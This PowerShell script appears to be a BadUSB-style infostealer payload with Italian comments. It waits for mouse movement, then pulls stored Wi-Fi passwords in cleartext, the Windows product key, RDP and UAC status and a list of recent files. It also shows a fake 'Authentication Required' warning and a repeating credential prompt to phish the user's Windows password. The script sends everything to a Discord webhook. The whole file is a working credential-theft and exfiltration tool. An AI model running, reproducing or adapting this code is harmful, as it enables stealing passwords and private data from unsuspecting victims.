 
# ----------------- PAUSE TILL MOUSE (+ 60 secs) !
Add-Type -AssemblyName System.Windows.Forms
$originalPOS = [System.Windows.Forms.Cursor]::Position.X
$o=New-Object -ComObject WScript.Shell
while (1) {
  $pauseTime = 60
  if ([Windows.Forms.Cursor]::Position.X -ne $originalPOS) { 
    break 
  } else { 
    $o.SendKeys("{CAPSLOCK}");Start-Sleep -Seconds $pauseTime 
  }
}



# ----------------- GET WIN SERIAL NUMBER !
$seriale = (Get-ItemProperty -Path "HKLM:\\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SoftwareProtectionPlatform" -Name "BackupProductKeyDefault")



# ----------------- GET STORED WIFI PASSes (EN) !
$wifiProfiles_EN = (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ssid=$name;pass=$pass }} | Format-Table -AutoSize | Out-String



# ----------------- GET STORED WIFI PASSes (IT) !
$wifiProfiles_IT = (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Contenuto Chiave\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ssid=$name;pass=$pass }} | Format-Table -AutoSize | Out-String



# ----------------- CHECK RDP STATUS
if ((Get-ItemProperty "hklm:\System\CurrentControlSet\Control\Terminal Server").fDenyTSConnections -eq 0) { 
	$RDP = "Enabled" 
} else {
	$RDP = "Disabled" 
}



# ----------------- GET RECENT FILES LIST !
$RecentFiles = Get-ChildItem -Path $env:USERPROFILE -Recurse -File | Sort-Object LastWriteTime -Descending | Select-Object -First 50 FullName, LastWriteTime



# ----------------- CAPS OFF !
Add-Type -AssemblyName System.Windows.Forms
$caps = [System.Windows.Forms.Control]::IsKeyLocked('CapsLock')
if ($caps -eq $true){
  $key = New-Object -ComObject WScript.Shell
  $key.SendKeys('{CapsLock}')
}



# ----------------- PROMPT AUTH WARNING !
Add-Type -AssemblyName PresentationCore,PresentationFramework
$msgBody = "Authentication timed out, please login using your Windows account."
$msgTitle = "Authentication Required"
$msgButton = 'Ok'
$msgImage = 'Warning'
$Result = [System.Windows.MessageBox]::Show($msgBody,$msgTitle,$msgButton,$msgImage)


# ----------------- GET UAC STATUS !
Function Get-RegistryValue($key, $value) {  (Get-ItemProperty $key $value).$value }
$Key = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" 
$ConsentPromptBehaviorAdmin_Name = "ConsentPromptBehaviorAdmin" 
$PromptOnSecureDesktop_Name = "PromptOnSecureDesktop" 
$ConsentPromptBehaviorAdmin_Value = Get-RegistryValue $Key $ConsentPromptBehaviorAdmin_Name 
$PromptOnSecureDesktop_Value = Get-RegistryValue $Key $PromptOnSecureDesktop_Name
If($ConsentPromptBehaviorAdmin_Value -Eq 0 -And $PromptOnSecureDesktop_Value -Eq 0){ $UAC = "Never notIfy" }
ElseIf($ConsentPromptBehaviorAdmin_Value -Eq 5 -And $PromptOnSecureDesktop_Value -Eq 0){ $UAC = "NotIfy me only when apps try to make changes to my computer(do not dim my desktop)" } 
ElseIf($ConsentPromptBehaviorAdmin_Value -Eq 5 -And $PromptOnSecureDesktop_Value -Eq 1){ $UAC = "NotIfy me only when apps try to make changes to my computer(default)" }
ElseIf($ConsentPromptBehaviorAdmin_Value -Eq 2 -And $PromptOnSecureDesktop_Value -Eq 1){ $UAC = "Always notIfy" }
Else{ $UAC = "Unknown" } 



# ----------------- PROMPT FOR CREDENTIALS !
$form = $null
while ($form -eq $null)
{
  $cred = $host.ui.promptforcredential('Failed Authentication!v5','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); 
  $cred.getnetworkcredential().password
  if([string]::IsNullOrWhiteSpace([Net.NetworkCredential]::new('', $cred.Password).Password))
  {
    if(-not ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.ManifestModule -like "*PresentationCore*" -or $_.ManifestModule -like "*PresentationFramework*" })) 
    { 
      Add-Type -AssemblyName PresentationCore,PresentationFramework 
    }
    $msgBody = "Credentials cannot be empty!"
    $msgTitle = "Error"
    $msgButton = 'Ok'
    $msgImage = 'Stop'
    $Result = [System.Windows.MessageBox]::Show($msgBody,$msgTitle,$msgButton,$msgImage)
    Write-Host "The user clicked: $Result"
    $form = $null
  } else {
    $creds = $cred.GetNetworkCredential() | fl
    $userlogin = $cred.username
    $passlogin = $cred.GetNetworkCredential().password
    $form = "OK"
  }
}



# ----------------- SEND RESULTS VIA DISCORD !
$Body = @{
  'username' = $env:username 
  'content' = ".
.
.
.
.
.
===================================

Ciao! 
Ho un regalino per te :)
L'ho trovato nel computer " + $env:computername + "

Wi-Fi Profiles and Passwords:
----------------------------------- 
" + $wifiProfiles_IT + $wifiProfiles_EN + "
  
Remote Desktop Status
----------------------------------- 
RDP: " + $RDP + "
  
UAC Status
----------------------------------- 
UAC: " + $UAC + "

Recent File List
-----------------------------------
" + $RecentFiles + "

Windows Serial
----------------------------------- 
S/N: " + $seriale.BackupProductKeyDefault + "
 
Windows Credentials
-----------------------------------
user: " + $userlogin + "
pass: " + $passlogin + "

                          ...... mica male eh? ;)
"
}
Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)  
